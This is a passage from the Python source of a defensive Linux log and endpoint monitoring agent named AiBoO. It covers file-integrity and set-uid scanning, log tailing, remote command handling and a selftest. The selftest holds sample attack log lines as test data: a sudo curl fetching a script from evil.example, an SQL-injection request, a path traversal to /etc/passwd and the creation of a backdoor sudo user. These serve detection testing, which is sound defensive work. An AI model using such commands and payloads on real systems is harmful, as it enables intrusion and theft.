                    extra={"source": "auditd", "file_path": path or name},
                ))
    return out


def detect_integrity(st: Settings, state: AgentState) -> list[Finding]:
    """
    File integrity: new/changed files in the watched folders + new set-uid binaries.
    Uses only reads; the hash map lives in the agent's own state file.
    """
    out: list[Finding] = []
    now = state.counters.now
    roots = [Path(p) for p in (st.watch_dirs or "").split(",") if p.strip()]
    seen_new: list[str] = []
    for root in roots:
        if not root.is_dir():
            continue
        for path in root.rglob("*"):
            if not path.is_file() or path.is_symlink():
                continue
            try:
                stat = path.stat()
            except OSError:
                continue
            if stat.st_size > 20 * 1024 * 1024:
                continue
            marker = f"{path}:{int(stat.st_mtime)}:{stat.st_size}"
            if state.already_sent(f"file:{marker}"):
                continue
            state.remember(f"file:{marker}")
            name = path.name.lower()
            dangerous = name.endswith(SCRIPT_EXTS)
            if not dangerous:
                continue
            digest = _file_hash(path)
            out.append(Finding(
                pattern="dropped_file", severity="high",
                summary=f"New/updated file in a watched folder: {path}",
                entity=str(path), confidence=0.7, source_file=str(path),
                dedup_key=f"file:{marker}",
                description=f"{path} was written (sha256 {digest[:16]}…). Web shells and "
                            f"dropped payloads usually look like this.",
                extra={"file_path": str(path), "sha256": digest, "size": stat.st_size},
            ))
            seen_new.append(str(path))
    return out


# A set-uid binary under these paths is how a normal Linux server works
# (/usr/bin/passwd, sudo, mount...). Reporting them buries the real alerts, so the
# first scan only records a baseline; afterwards AiBoO speaks up when a set-uid
# binary APPEARS or when one sits somewhere an attacker would drop it.
SUID_NORMAL_DIRS = ("/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/lib",
                    "/usr/libexec", "/usr/local/bin", "/usr/local/sbin")
SUID_WRITABLE_DIRS = ("/tmp", "/var/tmp", "/dev/shm", "/home", "/srv", "/var/www", "/run")
SUID_SCAN_DIRS = ("/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin",
                  "/usr/local/sbin", "/opt", "/srv", "/var/www", "/home", "/tmp", "/dev/shm")
SUID_MAX_FINDINGS = 20


def _suid_location(path: str) -> str:
    """'normal' | 'writable' (attacker's favourite) | 'unusual'."""
    for w in SUID_WRITABLE_DIRS:
        if path == w or path.startswith(w + "/"):
            return "writable"
    for n in SUID_NORMAL_DIRS:
        if path == n or path.startswith(n + "/"):
            return "normal"
    return "unusual"


def detect_suid_binaries(st: Settings, state: AgentState) -> list[Finding]:
    """Set-uid binaries (hourly): only new ones, or ones in odd places."""
    current: set[str] = set()
    for base in SUID_SCAN_DIRS:
        d = Path(base)
        if not d.is_dir():
            continue
        for path in d.rglob("*"):
            try:
                if not path.is_file() or path.is_symlink():
                    continue
                mode = path.stat().st_mode
            except OSError:
                continue
            if mode & 0o4000:
                current.add(str(path))

    if not state.suid_baseline:
        # First run on this server: learn what is normal and stay quiet about it.
        state.suid_baseline = current
        log(f"set-uid baseline recorded: {len(current)} known binaries (not reported)")
        return []

    fresh = current - state.suid_baseline
    state.suid_baseline = current
    if not fresh:
        return []

    out: list[Finding] = []
    hour = int(state.counters.now // 3600)
    for path in sorted(fresh)[:SUID_MAX_FINDINGS]:
        where = _suid_location(path)
        if where == "writable":
            severity, note = "high", ("it sits in a directory that users and services can write to - "
                                      "that is where attackers drop a privilege-escalation binary")
        elif where == "unusual":
            severity, note = "medium", "it is outside the normal system directories"
        else:
            severity, note = "medium", "it is new since the last scan (a package change or an intruder)"
        out.append(Finding(
            pattern="suid_binary", severity=severity,
            summary=f"New set-uid binary: {path}",
            entity=path, confidence=0.6, source_file=path,
            dedup_key=f"suid:{path}:{hour}",
            description=f"{path} runs with the file owner's rights (set-uid) and {note}.",
            extra={"file_path": path, "location": where},
        ))
    return out


def _file_hash(path: Path) -> str:
    import hashlib
    h = hashlib.sha256()
    try:
        with path.open("rb") as fh:
            for chunk in iter(lambda: fh.read(65536), b""):
                h.update(chunk)
    except OSError:
        return ""
    return h.hexdigest()


# ---------------------------------------------------------------------------
# Tailer - read only the NEW lines of each log file
# ---------------------------------------------------------------------------

DETECTORS = {
    "auth": detect_auth_line,
    "access": detect_access_line,
    "error": detect_error_line,
    "mysql": detect_mysql_line,
    "audit": detect_audit_line,
}


def read_new_lines(path: Path, state: AgentState, kind: str) -> list[str]:
    """Return lines added since the last run. Never writes to the file."""
    key = str(path)
    if not path.exists():
        return []
    try:
        size = path.stat().st_size
    except OSError:
        return []
    start = state.offsets.get(key, 0)
    if start > size:                       # rotated / truncated -> start over
        start = 0
        log(f"{path} was rotated - reading from the beginning")
    if start == size:
        return []
    try:
        with path.open("r", encoding="utf-8", errors="replace") as fh:
            fh.seek(start)
            data = fh.read()
            state.offsets[key] = fh.tell()
    except OSError as exc:
        log(f"cannot read {path}: {exc}", "WARN")
        return []
    lines = data.splitlines()
    if data and not data.endswith("\n"):
        # keep the incomplete last line for the next round
        state.offsets[key] -= len(lines[-1].encode("utf-8", "replace"))
        lines = lines[:-1]
    return lines


def watched_logs(st: Settings) -> list[tuple[str, str]]:
    """[(kind, path)] - only files that exist and are readable."""
    items: list[tuple[str, str]] = [
        ("auth", st.auth_log),
        ("access", st.nginx_access_log),
        ("error", st.nginx_error_log),
        ("mysql", st.mysql_error_log),
        ("audit", st.audit_log),
    ]
    for chunk in (st.extra_logs or "").split(","):
        if "=" in chunk:
            kind, path = chunk.split("=", 1)
            items.append((kind.strip().lower() or "access", path.strip()))
    out = []
    for kind, path in items:
        if not path:
            continue
        p = Path(path)
        if not p.exists():
            continue
        if not os.access(p, os.R_OK):
            log(f"cannot read {path} (permission) - add this user to the 'adm' group", "WARN")
            continue
        out.append((kind, str(p)))
    return out


def journal_lines(unit: str, state: AgentState, limit: int = 200) -> list[str]:
    """Best-effort journal read for an app service (no root needed if allowed)."""
    import subprocess
    key = f"journal:{unit}"
    since = state.offsets.get(key, 0)
    cmd = ["journalctl", "-u", unit, "-n", str(limit), "--no-pager", "-o", "cat"]
    if since:
        cmd = ["journalctl", "-u", unit, "--since", f"@{int(since)}", "--no-pager", "-o", "cat"]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
    except Exception:
        return []
    if res.returncode != 0:
        return []
    state.offsets[key] = int(time.time())
    return res.stdout.splitlines()


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

def _norm_command(cmd: str) -> str:
    """'/usr/sbin/usermod -L bob' and 'sudo usermod -L bob' -> 'usermod -L bob'."""
    parts = (cmd or "").split()
    while parts and os.path.basename(parts[0]) in ("sudo", "env"):
        parts = parts[1:]
    if not parts:
        return ""
    return os.path.basename(parts[0]) + (" " + " ".join(parts[1:]) if len(parts) > 1 else "")


def state_ran_recently(state: "AgentState", cmd: str, window: float = 120.0) -> bool:
    """True when AiBoO itself ran this command a moment ago (do not alert on ourselves)."""
    engine = getattr(state, "engine", None)
    if engine is None or not cmd:
        return False
    try:
        return engine.recently_ran(cmd, window)
    except Exception:                                             # noqa: BLE001
        return False


def should_decide(finding: Finding) -> bool:
    """Posture/health advice stays advisory: no approval popup for a low item."""
    if finding.pattern in ("config_weakness", "device_health_fail", "suid_binary"):
        return finding.severity in ("high", "critical")
    return True


def run_once(st: Settings, state: AgentState, sender: Sender, trust: int,
             factors: list[dict], with_posture: bool = False) -> int:
    state.counters.now = time.time()
    findings: list[Finding] = []

    for kind, path in watched_logs(st):
        detector = DETECTORS.get(kind, detect_access_line)
        for line in read_new_lines(Path(path), state, kind):
            if not line.strip():
                continue
            try:
                findings.extend(detector(line, st, state, path))
            except Exception as exc:          # one bad line must never stop us
                log(f"detector error on {path}: {exc}", "WARN")

    for unit in [u.strip() for u in (st.app_services or "").split(",") if u.strip()]:
        unit_path = f"journal:{unit}"
        for line in journal_lines(unit, state):
            if not line.strip():
                continue
            if re.search(r"(Traceback \(most recent call last\)|Internal Server Error|"
                         r"sqlalchemy|django\.db|OperationalError)", line):
                n = state.counters.bump(f"apperr:{unit}", 300)
                if n >= 10:
                    findings.append(Finding(
                        pattern="device_health_fail", severity="medium",
                        summary=f"{unit} is logging many errors ({n} in 5 min)",
                        entity=unit, confidence=0.6, source_file=unit_path, raw=line.strip(),
                        dedup_key=f"apperr:{unit}:{int(time.time() // 300)}",
                    ))
            findings.extend(detect_access_line(line, st, state, unit_path))

    if with_posture:
        findings.extend(posture_findings(st, state))
        findings.extend(detect_suid_binaries(st, state))

    # ---- EDR-ish collectors ---------------------------------------------
    if state.counters.now - getattr(state, "_last_proc_scan", 0.0) >= st.proc_scan_seconds:
        state._last_proc_scan = state.counters.now          # type: ignore[attr-defined]
        findings.extend(detect_suspicious_processes(st, state))
    if state.counters.now - getattr(state, "_last_integrity", 0.0) >= st.integrity_seconds:
        state._last_integrity = state.counters.now          # type: ignore[attr-defined]
        findings.extend(detect_integrity(st, state))

    # ---- things the response engine saw (decoy hits, auto unlocks) ------
    engine = getattr(state, "engine", None)
    if engine is not None:
        for ev in engine.drain_events():
            if ev.get("kind") == "decoy_hit":
                findings.append(Finding(
                    pattern="network_intrusion", severity="high",
                    summary=f"Decoy port {ev['port']} touched by {ev['peer']}"
                            + (f" - sent {ev['payload'][:60]!r}" if ev.get("payload") else ""),
                    src_ip=str(ev.get("peer", "")).split(":")[0], entity=ev.get("peer", ""),
                    confidence=0.9, source_file="decoy",
                    dedup_key=f"decoy:{ev.get('lock_id')}:{ev.get('peer')}:{ev.get('time')}",
                    description=f"Someone connected to the AiBoO decoy (honeypot) on port "
                                f"{ev['port']}: {ev.get('payload', '')[:200]}",
                    extra={"decoy_port": ev.get("port"), "lock_id": ev.get("lock_id")},
                ))
        for user in engine.restrictions_due():
            res = engine.unlock_user(user)
            log(f"auto-unlock {user}: {res.get('message')}")
        if engine.isolation_due():
            engine.release_isolation()
            log("full isolation auto-released after its timer")

    sent = 0
    for f in findings:
        if f.dedup_key and state.already_sent(f.dedup_key):
            continue
        if not f.dedup_key:
            f.dedup_key = f"anon_{abs(hash(f.summary + f.raw)) % (10**12)}"
        sender.send_finding(f)
        risk, intent = risk_of(f, trust, st.importance)
        if risk >= 35 and should_decide(f):   # only HOLD/BLOCK become decisions
            sender.send_decision(f, risk, trust, intent, factors, st.importance)
        sent += 1
    state.save()
    return sent


def replay(path: str, st: Settings, state: AgentState, sender: Sender) -> int:
    """Replay a log file through the detectors (demo + tests)."""
    kind = "auth"
    low = path.lower()
    if "access" in low or "nginx" in low:
        kind = "access"
    elif "error" in low:
        kind = "error"
    elif "mysql" in low:
        kind = "mysql"
    detector = DETECTORS[kind]
    trust, factors = trust_score()
    total = 0
    for line in Path(path).read_text(errors="replace").splitlines():
        if not line.strip():
            continue
        for f in detector(line, st, state, path):
            total += 1
            if f.dedup_key and state.already_sent(f.dedup_key):
                continue
            if not f.dedup_key:
                f.dedup_key = f"replay_{abs(hash(f.summary + f.raw)) % (10**12)}"
            sender.send_finding(f)
            risk, intent = risk_of(f, trust, st.importance)
            if risk >= 35 and should_decide(f):
                sender.send_decision(f, risk, trust, intent, factors, st.importance)
            if sender.st.dry_run:
                log(f"   risk={risk} verdict={verdict_for_risk(risk).upper()}")
    state.save()
    return total


def selftest() -> int:
    """Built-in checks so the client can see the parsers work with no server."""
    st = Settings(dry_run=True, endpoint_name="selftest-linux", blocklist_file="")
    state = AgentState(Path("/tmp/aiboo-linux-selftest-state.json"))
    state.reset_offsets()
    samples = [
        ("auth", "Feb 11 03:14:15 web sshd[123]: Failed password for invalid user admin from 45.95.147.3 port 51000 ssh2"),
        ("auth", "Feb 11 03:14:16 web sshd[124]: Failed password for root from 45.95.147.3 port 51002 ssh2"),
        ("auth", "Feb 11 03:14:20 web sshd[130]: Accepted password for deploy from 45.95.147.3 port 51004 ssh2"),
        ("auth", "Feb 11 03:15:00 web sudo: xenthives : TTY=pts/0 ; PWD=/home/xenthives ; USER=root ; COMMAND=/usr/bin/curl http://evil.example/x.sh"),
        ("auth", "Feb 11 03:16:00 web useradd[900]: new user: name=backdoor, UID=1002"),
        ("auth", "Feb 11 03:16:30 web usermod[901]: add 'backdoor' to group 'sudo'"),
        ("auth", "Feb 11 03:17:00 web crontab[902]: (root) REPLACE (root)"),
        ("access", '45.95.147.3 - - [11/Feb/2026:03:20:01 +0530] "GET /api/login?user=admin%27%20OR%20%271%27%3D%271 HTTP/1.1" 403 512 "-" "sqlmap/1.7"'),
        ("access", '45.95.147.3 - - [11/Feb/2026:03:20:02 +0530] "GET /.env HTTP/1.1" 200 88 "-" "curl/8"'),
        ("access", '45.95.147.3 - - [11/Feb/2026:03:20:03 +0530] "GET /../../etc/passwd HTTP/1.1" 404 162 "-" "curl/8"'),
        ("error", "2026/02/11 03:20:10 [error] 15#15: *9 client: 45.95.147.3 SSL_do_handshake() failed"),
        ("mysql", "2026-02-11T03:21:00 Access denied for user 'root'@'45.95.147.3' (using password: YES)"),
    ]
    trust, factors = trust_score()
    found: list[tuple[str, str, int, str]] = []
    for kind, line in samples:
        for f in DETECTORS[kind](line, st, state, f"{kind}.log"):
            risk, _ = risk_of(f, trust, st.importance)
            found.append((f.pattern, f.severity, risk, verdict_for_risk(risk)))
    print(f"selftest: {len(found)} finding(s) from {len(samples)} sample lines")
    for pattern, severity, risk, verdict in found:
        print(f"  {pattern:26} severity={severity:8} risk={risk:3} verdict={verdict.upper()}")
    ok = len(found) >= 8
    print("RESULT:", "OK" if ok else "FAILED")
    state.path.unlink(missing_ok=True)
    return 0 if ok else 1


def handle_commands(st: Settings, state: AgentState, sender: Sender, engine) -> int:
    """Run the commands the dashboard queued for this Linux endpoint."""
    if engine is None:
        return 0
    done = 0
    for cmd in sender.fetch_commands():
        cmd_id = str(cmd.get("cmd_id") or "")
        action = str(cmd.get("action") or "")
        target = str(cmd.get("target") or "")
        params = cmd.get("params") or {}
        if not cmd_id or not action:
            continue
        log(f"remote command: {action} target={target or '-'} ({cmd_id})")
        result = engine.execute(action, target, params)
        status = result.get("status", "failed")
        sender.ack_command(cmd_id, status, result.get("message", ""),
                           result.get("details", ""), result.get("metadata", {}))
        log(f"remote command {action} -> {status}: {result.get('message', '')}")
        done += 1
    return done


def auto_respond(st: Settings, state: AgentState, engine, findings: list[Finding]) -> None:
    """Optional: act on the worst findings by itself (opt-in in config.ini).

    Only ever runs when allow_response = yes AND the operator asked for it:
      * edr_kill_on_sight        -> kill a reverse shell / C2 process
      * edr_quarantine_on_sight  -> move a dropped web shell into quarantine
    """
    if engine is None or not st.allow_response:
        return
    for f in findings:
        if f.pattern == "reverse_shell" and st.edr_kill_on_sight:
            pid = str(f.extra.get("pid") or "")
            if pid:
                res = engine.execute("terminate_process", pid, {"reason": "reverse shell seen by AiBoO"})
                log(f"auto-kill pid {pid}: {res.get('message')}")
        if f.pattern == "dropped_file" and st.edr_quarantine_on_sight:
            path = str(f.extra.get("file_path") or "")
            if path:
                res = engine.execute("quarantine_file", path, {"reason": "dropped file seen by AiBoO"})
                log(f"auto-quarantine {path}: {res.get('message')}")


def main(argv: list[str]) -> int:
    import argparse
    ap = argparse.ArgumentParser(description="AiBoO Linux Sentinel (read-only log agent)")
    ap.add_argument("--config", default=str(DEFAULT_CONFIG))
    ap.add_argument("--remote-url")
    ap.add_argument("--api-key")
    ap.add_argument("--endpoint-name")
    ap.add_argument("--importance", choices=list(IMPACT_POINTS))
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--once", action="store_true", help="read new lines once, then exit")
    ap.add_argument("--replay", metavar="FILE", help="replay a log file through the detectors")
    ap.add_argument("--selftest", action="store_true", help="run built-in parser checks")
    ap.add_argument("--capabilities", action="store_true",
                    help="show what this agent is allowed to change on this server")
    ap.add_argument("--run-action", metavar="ACTION",
                    help="run ONE response action locally (e.g. 'list', 'block_access')")
    ap.add_argument("--target", default="", help="target for --run-action")
    ap.add_argument("--reset-state", action="store_true", help="forget offsets/counters")
    ap.add_argument("--version", action="version", version=f"{AGENT_NAME} {VERSION}")
    args = ap.parse_args(argv)

    if not DEFAULT_CONFIG.exists() and EXAMPLE_CONFIG.exists():
        log("config.ini not found - creating it from config.ini.example")
        try:
            DEFAULT_CONFIG.write_text(EXAMPLE_CONFIG.read_text(encoding="utf-8"), encoding="utf-8")
        except OSError:
            pass

    st = load_settings(Path(args.config), {
        "remote_url": args.remote_url, "api_key": args.api_key,
        "endpoint_name": args.endpoint_name, "importance": args.importance,
        "dry_run": True if args.dry_run else None,
    })
    if args.dry_run:
        st.dry_run = True

    if args.selftest:
        return selftest()

    if args.capabilities or args.run_action:
        engine = ResponseEngine(st, lambda m, level="INFO": log(m, level), DIR) if ResponseEngine else None
        if engine is None:
            log("aiboo_linux_response.py is missing next to the agent - response engine unavailable", "ERROR")
            return 1
        caps = engine.capabilities()
        print(json.dumps(caps, indent=2))
        if args.run_action:
            result = engine.execute(args.run_action, args.target)
            print(json.dumps(result, indent=2))
            return 0 if result.get("status") == "executed" else 1
        return 0

    state = AgentState(DIR / STATE_FILE_NAME)
    if args.reset_state:
        state.reset_offsets()
        log("state cleared")

    sender = Sender(st, state)
    engine = None
    if ResponseEngine is not None:
        engine = ResponseEngine(st, lambda m, level="INFO": log(m, level), DIR)
        state.engine = engine                                  # type: ignore[attr-defined]
        caps = engine.capabilities()
        log(f"response engine: allow_response={caps['allow_response']} "
            f"dry_run={caps['dry_run']} root={caps['root']} sudo={caps['sudo_nopasswd']} "
            f"can_change={caps['can_change']} tools="
            + ",".join(k for k, v in caps["tools"].items() if v))
    trust, factors = trust_score()
    log(f"starting: endpoint={st.endpoint_name} server={st.remote_url} "
        f"importance={st.importance} trust={trust}"
        + (" [DRY RUN]" if st.dry_run else ""))

    if args.replay:
        total = replay(args.replay, st, state, sender)
        log(f"replay finished: {total} finding(s), {sender.sent_findings} finding(s) sent, "
            f"{sender.sent_decisions} decision(s) sent")
        return 0

    if not st.dry_run:
        sender.heartbeat()
        sender.refresh_importance()
    trust, factors = trust_score()

    if args.once:
        found = run_once(st, state, sender, trust, factors, with_posture=True)
        log(f"once: {found} finding(s) sent")
        if engine is not None:
            handle_commands(st, state, sender, engine)
        return 0

    last_heartbeat = 0.0
    last_importance = 0.0
    last_posture = 0.0
    sender.flush_queue()
    while True:
        try:
            now = time.time()
            if not st.dry_run and now - last_heartbeat >= st.heartbeat_seconds:
                sender.heartbeat()
                last_heartbeat = now
            if not st.dry_run and now - last_importance >= st.importance_refresh_seconds:
                sender.refresh_importance()
                last_importance = now
            posture_due = now - last_posture >= 3600
            if posture_due:
                trust, factors = trust_score()
                last_posture = now
            found = run_once(st, state, sender, trust, factors, with_posture=posture_due)
            if found:
                log(f"sent {found} finding(s) (total findings={sender.sent_findings}, "
                    f"decisions={sender.sent_decisions}, queue errors={sender.errors})")
            if not st.dry_run:
                handle_commands(st, state, sender, engine)
            if not st.dry_run and now - last_heartbeat >= st.heartbeat_seconds * 5:
                sender.flush_queue()
        except KeyboardInterrupt:
            log("stopping (Ctrl+C)")
            state.save()
            return 0
        except Exception as exc:
            log(f"loop error: {exc}", "ERROR")
        time.sleep(st.poll_seconds)


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
